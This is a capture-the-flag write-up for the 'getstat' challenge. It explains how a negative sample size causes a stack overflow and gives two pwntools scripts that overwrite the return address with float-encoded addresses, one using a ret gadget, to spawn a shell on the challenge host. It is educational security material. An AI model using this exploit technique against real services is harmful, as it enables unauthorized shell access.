# [getstat](https://github.com/redrocket-ctf/csr-2021-tasks/tree/main/getstat)

## Challenge setup

The challenge consists of a remote (binary) service that accepts a number of
probes and calculates the average and deviation of all probes.  
The binary and docker setup of the remote server are provided with the
challenge.

```  
           _       _        _     
          | |     | |      | |    
 __ _  ___| |_ ___| |_ __ _| |_  
/ _` |/ _ \ __/ __| __/ _` | __|  
| (_| |  __/ |_\__ \ || (_| | |_   
\__, |\___|\__|___/\__\__,_|\__|  
 __/ |                            
|___/  
  
Bitte Größe der Stichprobe eingeben: 2  
Bitte Wert eingeben: 1  
Bitte Wert eingeben: 2  
Arithmetisches Mittel: 1.5000000  
Korrigierte Stichprobenvarianz: 0.500000  
```

## First look:

- You can enter negative sizes and you still get prompted for input  
- You can abort the program by entering somthing that can't be parsed as a float  
- When you enter something like `-1` for size, enter enough data points and then abort, you receive  
  ```  
  *** stack smashing detected ***: terminated  
  Aborted (core dumped)  
  ```  
- The values seem to be allocated on the stack!

It should be possible to overwrite the return address and then abort the
program to jump to arbitrary addresses.

Tasks:  
- Figure out offset of stack pointer  
- Figure out where we should jump to

For this, we disassembled the provided binary using ghidra.  
There, we tried to understand the code by renaming some labels and found out
that the binary contains a shell function at address `0x401360` that calls
system with `sh`  
Furthermore, we noticed that the values are read as 64bit floats, so we have
to enter all addresses using floating point numbers.

The stack offset is 16byte aligned, and the return address is 88 bytes from
the input pointer, so we use size `-10` to get close to the return address,  
then write some garbage, and the target address as a float.

First exploit:  
```py  
from pwn import *  
import struct

def iToF(i):  
 b = struct.pack('q', i)  
 return struct.unpack('d', b)[0]  
  
addr = 0x401360

r = remote('challs.rumble.host', 3143)  
r.sendlineafter(b':', b'-10')  
r.sendlineafter(b':', b'0')  
r.sendlineafter(b':', bytes(str(iToF(addr)), 'utf-8'))  
r.sendlineafter(b':', b'a')  
r.interactive()  
```

This worked on my local machine, but not on the remote host.  
Thankfully, the docker setup of the challenge was also provided.  
Debugging the exploit in docker revealed that the `system('sh')` expected a
16byte stack alignment, while our stack alignment was only 8bytes.

This can be fixed by a 'ret gadget'.

Instead of jumping directly to the shell function, we first jump to another
ret instruction, which pops additional 8 bytes from the stack, fixing our
stack alignment.

The main function itself has a ret instruction at a static address, so we just
use it.

```py  
from pwn import *  
import struct

def iToF(i):  
 b = struct.pack('q', i)  
 return struct.unpack('d', b)[0]  
  
ret = 0x4013e4  
addr = 0x401360

r = remote('challs.rumble.host', 3143)  
r.sendlineafter(b':', b'-10')  
r.sendlineafter(b':', b'0')  
r.sendlineafter(b':', bytes(str(iToF(ret)), 'utf-8'))  
r.sendlineafter(b':', bytes(str(iToF(addr)), 'utf-8'))  
r.sendlineafter(b':', b'a')  
r.interactive()  
```

Now we have an interactive shell, and we can read the flag from the
filesystem.

Original writeup
(https://github.com/rnxpyke/CSR2021-writeups/blob/main/getstat.MD).